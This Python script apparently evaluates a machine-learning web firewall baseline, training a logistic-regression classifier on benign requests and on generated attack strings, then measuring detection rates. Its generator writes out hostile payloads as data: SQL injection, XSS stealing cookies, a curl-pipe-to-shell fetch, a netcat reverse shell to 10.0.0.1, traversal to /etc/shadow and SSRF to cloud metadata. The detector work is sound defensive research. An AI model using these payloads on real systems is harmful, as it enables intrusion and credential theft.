"""Static ML-WAF baseline (spec baseline 3): a per-request classifier trained once, offline.

    python eval/ml_baseline.py [--benign-train 60000]

A hashed character n-gram logistic regression (numpy only; nothing is installed or downloaded)
trained on (a) benign requests from our 443k corpus and (b) a GENERATED attack set: thousands of
SQLi / XSS / command-injection / traversal / SSRF variants from a small grammar, wrapped in
query strings or JSON bodies and randomly URL-encoded. The threshold is set on a separate
benign validation split so that at most 0.01% of benign requests are flagged (AEGIS's own budget).
Splits are by hash of the request, so identical requests never straddle train/validation/test.

Reported, at that threshold: detection of (1) held-out generated variants, (2) the REAL campaign
requests our attack scripts send, (3) mutants of those, (4) four attack families never in training
(SSTI, NoSQL operators, XXE, JNDI), (5) the behavioural campaigns (credential stuffing, IDOR,
enumeration), whose individual requests look normal. The baseline is only as strong as this
training-data generator; that is the main caveat (a public labelled corpus such as CSIC-2010
would need a download and was not used).
"""

from __future__ import annotations

import argparse
import hashlib
import json
import random
import sys
import urllib.parse
import zlib
from pathlib import Path

import numpy as np

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "range" / "mutate"))
import mutate as mut  # noqa: E402

DIM = 1 << 18
NGRAMS = (2, 3, 4)


# --- features ------------------------------------------------------------------------
def norm(method: str, uri: str, body: str) -> str:
    t = f"{method} {uri} {body or ''}"
    for _ in range(2):
        t = urllib.parse.unquote_plus(t)
    return t.lower()[:2000]


def feats(text: str) -> np.ndarray:
    b = text.encode("utf-8", "replace")
    idx = [zlib.crc32(b[i:i + n]) & (DIM - 1) for n in NGRAMS for i in range(len(b) - n + 1)]
    return np.array(idx, dtype=np.int64)       # crc32, not hash(): reproducible across runs


def featurize(recs: list[dict]) -> list[np.ndarray]:
    return [feats(norm(r.get("method", "GET"), r.get("uri", ""), r.get("body", ""))) for r in recs]


# --- model -----------------------------------------------------------------------------
class LR:
    def __init__(self):
        self.w = np.zeros(DIM, dtype=np.float32)
        self.b = 0.0

    def score(self, x: np.ndarray) -> float:
        if x.size == 0:
            return self.b
        return float(self.w[x].sum() / np.sqrt(x.size) + self.b)

    def fit(self, X: list[np.ndarray], y: np.ndarray, epochs: int = 6, lr: float = 0.5, l2: float = 1e-6, seed: int = 1):
        rng = np.random.default_rng(seed)
        order = np.arange(len(X))
        for _ in range(epochs):
            rng.shuffle(order)
            for s in range(0, len(order), 256):
                batch = order[s:s + 256]
                gw = np.zeros(DIM, dtype=np.float32)
                gb = 0.0
                for i in batch:
                    x = X[i]
                    z = self.score(x)
                    p = 1.0 / (1.0 + np.exp(-np.clip(z, -30, 30)))
                    g = (p - y[i])
                    if x.size:
                        np.add.at(gw, x, g / np.sqrt(x.size))
                    gb += g
                self.w -= lr * (gw / len(batch) + l2 * self.w)
                self.b -= lr * gb / len(batch)
        return self


# --- generated attack training data -------------------------------------------------------
def gen_attacks(n: int, seed: int) -> list[tuple[str, dict]]:
    r = random.Random(seed)
    out = []
    ws = lambda: r.choice([" ", "  ", "\t", "/**/", "%20", "+"])  # noqa: E731
    cmt = lambda: r.choice(["--", "-- -", "#", "/*", ""])  # noqa: E731
    q = lambda: r.choice(["'", "'", '"', "')", "\")", ""])  # noqa: E731
    kw = lambda w: "".join(c.upper() if r.random() < 0.4 else c for c in w)  # noqa: E731

    def sqli():
        k = r.randrange(5)
        if k == 0:
            return f"{q()}{ws()}{kw('or')}{ws()}{r.randint(1, 9)}={r.randint(1, 9)}{cmt()}"
        if k == 1:
            cols = ",".join(r.choice(["null", "1", "2", "user", "password", "version()", "@@version"]) for _ in range(r.randint(2, 5)))
            return f"{q()}{ws()}{kw('union')}{ws()}{kw('select')}{ws()}{cols}{ws()}{kw('from')}{ws()}{r.choice(['users', 'information_schema.tables', 'sqlite_master'])}{cmt()}"
        if k == 2:
            return f"{r.choice(['admin', 'root', 'x', ''])}{q()}{cmt()}"
        if k == 3:
            return f"{q()}{ws()}{kw('and')}{ws()}{kw('sleep')}({r.randint(1, 9)}){cmt()}"
        return f"{q()};{ws()}{kw('drop')}{ws()}{kw('table')}{ws()}{r.choice(['users', 'orders'])}{cmt()}"

    def xss():
        tag = r.choice(["script", "img", "svg", "iframe", "body", "details", "input"])
        ev = r.choice(["onerror", "onload", "onfocus", "ontoggle", "onmouseover"])
        fn = r.choice(["alert(1)", "prompt(1)", "confirm(document.cookie)", "fetch('//x')"])
        k = r.randrange(3)
        if k == 0:
            return f"<{tag}>{fn}</{tag}>" if tag == "script" else f"<{tag} src=x {ev}={fn}>"
        if k == 1:
            return f"\"><{tag} {ev}={fn}>"
        return f"javascript:{fn}"

    def cmdi():
        sep = r.choice([";", "|", "||", "&&", "`", "$(", "\n"])
        cmd = r.choice(["cat /etc/passwd", "id", "whoami", "ls -la", "uname -a", "ping -c 1 127.0.0.1", "sleep 5", "curl http://x/s.sh|sh", "nc -e /bin/sh 10.0.0.1 4444"])
        end = ")" if sep == "$(" else ("`" if sep == "`" else "")
        return f"{r.choice(['localhost', 'x', '8.8.8.8', ''])}{sep}{ws()}{cmd}{end}"

    def trav():
        up = r.choice(["../", "..\\", "%2e%2e/", "..%2f", "....//", "%252e%252e%252f"]) * r.randint(2, 7)
        return up + r.choice(["etc/passwd", "windows/win.ini", "etc/shadow", "proc/self/environ", "boot.ini"])

    def ssrf():
        host = r.choice(["127.0.0.1", "localhost", "169.254.169.254", "[::1]", "0.0.0.0", "metadata.google.internal"])
        return f"{r.choice(['http', 'https', 'file', 'gopher'])}://{host}{r.choice(['/', '/latest/meta-data/', '/admin', ':8080/', '/etc/passwd'])}"

    gens = {"sqli": sqli, "xss": xss, "cmdi": cmdi, "traversal": trav, "ssrf": ssrf}
    params = ["q", "search", "id", "name", "url", "file", "comment", "email", "host", "path", "message"]
    for cls, g in gens.items():
        for _ in range(n):
            p = g()
            enc = r.choice([0, 0, 1, 1, 2])
            pe = urllib.parse.quote(p) if enc == 1 else (urllib.parse.quote(urllib.parse.quote(p)) if enc == 2 else p)
            if r.random() < 0.6:
                path = r.choice(["/search", "/rest/products/search", "/api/items", "/view", "/download", "/redirect"])
                rec = {"method": "GET", "uri": f"{path}?{r.choice(params)}={pe}", "body": ""}
            else:
                key = r.choice(params)
                rec = {"method": "POST", "uri": r.choice(["/rest/user/login", "/api/Feedbacks", "/submit", "/api/login"]),
                       "body": json.dumps({key: p})}
            out.append((cls, rec))
    return out


# --- data -----------------------------------------------------------------------------------
def split_of(rec: dict) -> int:
    h = hashlib.md5(f"{rec.get('method')}|{rec.get('uri')}|{rec.get('body')}".encode("utf-8", "replace")).digest()[0]
    return 0 if h < 77 else (1 if h < 153 else 2)       # ~30% train pool, ~30% validation, ~40% test


def load_benign(path: Path):
    parts = ([], [], [])
    seen = set()
    with path.open(encoding="utf-8") as f:
        for line in f:
            try:
                r = json.loads(line)
            except json.JSONDecodeError:
                continue
            uri = r.get("uri") or ""
            if not uri.startswith("/") or uri.startswith("/socket.io"):
                continue
            rec = {"method": r.get("method") or "GET", "uri": uri, "body": r.get("body") or ""}
            k = (rec["method"], rec["uri"], rec["body"])
            if k in seen:
                continue                                  # distinct requests only
            seen.add(k)
            parts[split_of(rec)].append(rec)
    return parts


def campaign_requests(path: Path):
    by = {}
    for line in path.open(encoding="utf-8"):
        r = json.loads(line)
        if r.get("malicious"):
            by.setdefault(r["attack_class"], []).append({"method": r["method"], "uri": r["uri"], "body": r.get("body", "")})
    return by


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--benign-train", type=int, default=60000)
    ap.add_argument("--attack-train", type=int, default=3000, help="generated variants per class")
    ap.add_argument("--epochs", type=int, default=6)
    args = ap.parse_args()
    random.seed(1)

    benign_path = next((ROOT / "data" / "benign_corpus").glob("benign_*detect*.jsonl"))
    tr, va, te = load_benign(benign_path)
    rng = random.Random(3)
    rng.shuffle(tr)
    tr = tr[:args.benign_train]
    print(f"benign distinct requests: train pool {len(tr)}, validation {len(va)}, test {len(te)}", flush=True)

    atk = gen_attacks(args.attack_train, 11)
    held = gen_attacks(400, 99)                       # different seed: held-out variants of the same families
    X = featurize(tr) + featurize([a for _, a in atk])
    y = np.array([0] * len(tr) + [1] * len(atk), dtype=np.float32)
    model = LR().fit(X, y, epochs=args.epochs)

    def scores(recs):
        return np.array([model.score(f) for f in featurize(recs)])
    sv = np.sort(scores(va))
    allowed = max(1, int(1e-4 * len(sv)))
    thr = sv[-allowed - 1]
    thr_lax = np.sort(scores(va))[-max(1, int(1e-3 * len(sv))) - 1]
    st = scores(te)
    fp, fp_lax = float((st > thr).mean()), float((st > thr_lax).mean())
    print(f"threshold {thr:.2f} (valid FP budget 0.01%): test benign FP = {fp*100:.4f}% of {len(st)}"
          f"  | lax threshold {thr_lax:.2f}: FP {fp_lax*100:.3f}%")

    def rate(recs):
        if not recs:
            return float("nan"), float("nan")
        s = scores(recs)
        return float((s > thr).mean()), float((s > thr_lax).mean())

    rows = []
    for cls in ("sqli", "xss", "cmdi", "traversal", "ssrf"):
        rows.append((f"held-out generated {cls}", *rate([a for c, a in held if c == cls])))
    camps = campaign_requests(ROOT / "logs" / "attacks" / "m1_episode_attacks.jsonl")
    name = {"sqli": "sqli", "xss": "xss", "path_traversal": "traversal", "command_injection": "cmdi", "ssrf": "ssrf"}
    for c, label in name.items():
        reqs = camps.get(c, [])
        rows.append((f"REAL campaign requests: {c}", *rate(reqs)))
        rows.append((f"  ...their mutants: {c}", *rate(mut.mutate_corpus(reqs))))
    for fam in ("ssti", "nosqli", "xxe", "jndi"):
        d = json.loads((ROOT / "data" / "attack_corpus" / f"novel_{fam}.json").read_text(encoding="utf-8"))
        rows.append((f"NOVEL family (never trained): {fam}", *rate(d["requests"])))
    for c in ("credential_stuffing", "idor_bola", "user_enumeration"):
        rows.append((f"behavioural campaign, per request: {c}", *rate(camps.get(c, []))))
    print(f"\n{'what':54s} {'det@FP0.01%':>12s} {'det@FP0.1%':>11s}")
    out = {"fp_test_0.01pct_threshold": fp, "fp_test_lax": fp_lax, "rows": []}
    for w, a, b in rows:
        print(f"{w:54s} {a*100:11.1f}% {b*100:10.1f}%")
        out["rows"].append({"what": w, "detect_at_fp_0.01pct": a, "detect_at_fp_0.1pct": b})
    (ROOT / "docs" / "data" / "ml_baseline.json").write_text(json.dumps(out, indent=1), encoding="utf-8")
    return 0


if __name__ == "__main__":
    sys.exit(main())
